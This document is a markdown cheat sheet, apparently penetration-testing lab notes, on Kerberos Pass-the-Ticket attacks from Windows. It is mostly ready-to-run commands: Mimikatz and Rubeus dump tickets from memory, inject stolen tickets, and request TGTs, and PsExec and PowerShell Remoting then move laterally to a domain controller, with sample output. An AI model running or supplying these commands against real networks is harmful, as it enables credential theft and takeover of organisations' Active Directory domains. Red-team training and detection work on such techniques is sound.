### Content
- [PtT from Windows](#ptt-from-windows)
	- [Conduct internal reconnaissance](#conduct-internal-reconnaissance)
	- [Access resources as the another user](#access-resources-as-the-another-user)
	- [Pass The Ticket with PowerShell Remoting (Windows)](#pass-the-ticket-with-powershell-remoting-(windows))
		- [Mimikatz - PowerShell Remoting with Pass the Ticket](#mimikatz---powershell-remoting-with-pass-the-ticket)
		- [Rubeus - PowerShell Remoting with Pass the Ticket](#rubeus---powershell-remoting-with-pass-the-ticket)
---
- In this attack, we use a stolen Kerberos ticket to move laterally
- A valid Kerberos ticket required to perform a `(PtT)` can be:
	- `TGS` to allow access to a particular resource.
	- `TGT` to request service tickets to access any resource the user has privileges on.
- **As a non-administrative user**, you can only get your tickets, but **as a local administrator**, you can collect everything.
---
## PtT from Windows
1. Mimikatz
	``` Powershell
	# Collect tickets
	PS> mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"
	########
	# mimikatz outputs all tickets to screen and also writes them individually to files in the current directory.
	# Computer account ticket: Ends with $ and needs a ticket to interact with AD
	# User ticket: [randomvalue]-username@service-domain.local.kirbi
	#########
	
	# Inject tickets
	PS> mimikatz.exe "privilege::debug" "kerberos::ptt [0;1e4c7df]-2-0-40e10000-joed@krbtgt-DOMAIN.COM.kirbi"
	
	# spawn CMD with the injected ticket
	PS> mimikatz.exe "misc::cmd"
	```
2. Rubeus
	``` Powershell
	# Collect tickets
	PS> Rubeus.exe dump /nowrap
	
	# Convert .kirbi to Base64 Format
	PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[randomvalue]-username@service-domain.local.kirbi"))
	# Inject ticket kirbi file
	PS> Rubeus.exe ptt /ticket:<.kirbi file>
	
	# Inject ticket base64 blob
	PS> Rubeus.exe ptt /ticket:<Base64Blob>
	```
---
### Conduct internal reconnaissance
Once a stolen ticket is ready for reuse, the threat actor needs to determine where it can be used:
``` Powershell
PS> net user joed /domain
```
### Access resources as the another user
Used after injecting ticket with either Rubeus or Mimikatz
``` Powershell
PS> .\PsExec.exe \\workstation456 powershell.exe
```
### Pass The Ticket with PowerShell Remoting (Windows)
- Enabling [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) creates both HTTP port TCP/5985 and HTTPS port TCP/5986 listeners.
- To create a PowerShell Remoting session on a remote computer, you must have `administrative permissions`, be a member of the `Remote Management Users group`, or have explicit `PowerShell Remoting permissions` in your session configuration.
#### Mimikatz - PowerShell Remoting with Pass the Ticket
``` Powershell
# Once the ticket is imported into our sesssion, if it's a cmd session, open powershell 
PS> mimikatz.exe "privilege::debug" "kerberos::ptt [0;1e4c7df]-2-0-40e10000-joed@krbtgt-DOMAIN.COM.kirbi"

# Use the command Enter-PSSession to connect to the target machine.
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\joed\Documents> whoami
doamin\joed
[DC01]: PS C:\Users\joed\Documents> hostname
DC01
[DC01]: PS C:\Users\joed\Documents>
```
#### Rubeus - PowerShell Remoting with Pass the Ticket
Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.
``` CMD
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# The above command will open a new cmd window.
# From that window, we can execute Rubeus to request a new TGT 
# with the option /ptt to import the ticket into our current session 
# Then connect to the DC using PowerShell Remoting.
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256: /ptt
c:\tools>powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```
---


